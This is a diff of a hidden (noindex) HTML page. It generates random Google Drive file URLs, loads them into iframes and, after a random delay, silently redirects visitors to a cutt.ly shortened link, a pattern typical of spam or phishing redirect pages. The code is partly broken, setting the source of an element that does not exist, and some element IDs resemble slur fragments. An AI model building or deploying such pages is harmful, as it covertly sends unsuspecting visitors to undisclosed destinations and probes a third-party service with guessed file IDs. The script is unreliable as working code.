@@ -8,20 +8,25 @@
 <meta name=”robots” content=”noindex,nofollow”>
 </head>
 <body>
-<script>var randPassword = Array(11).fill("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz").map(function(x) { return x[Math.floor(Math.random() * x.length)] }).join('');</script>
+<script>var randPassword = Array(12).fill("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz").map(function(x) { return x[Math.floor(Math.random() * x.length)] }).join('');</script>
+<script>var randPass = Array(8).fill("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz").map(function(x) { return x[Math.floor(Math.random() * x.length)] }).join('');</script>
 <br>
 <script>
 var urlick = "https://drive.google.com/file/"+randPassword;
+var ulick = "https://drive.google.com/file/"+randPass;
 document.getElementById("nigaf").src = urlick;
+document.getElementById("nif").src = ulick;
 </script>
 <br>
 <iframe id="nigaf" src=https://drive.google.com/file/ style="border-width:0" width=300px height=480px frameborder="0"></iframe>
+<br>
+<iframe id="nif" src=https://google.com/ style="border-width:0" width=300px height=480px frameborder="0"></iframe>
 <script>
 document.getElementById("nigaf").src = urlick;
-var maximum = 6500;
-var minimum = 2500;
+document.getElementById("nig").src = ulick;
+var maximum = 6600;
+var minimum = 3000;
 var randomnumber = Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
-document.write(randomnumber);
 window.setTimeout( function() {
 window.location.href = "https://cutt.ly/hZZiQl9";  
 }, randomnumber);
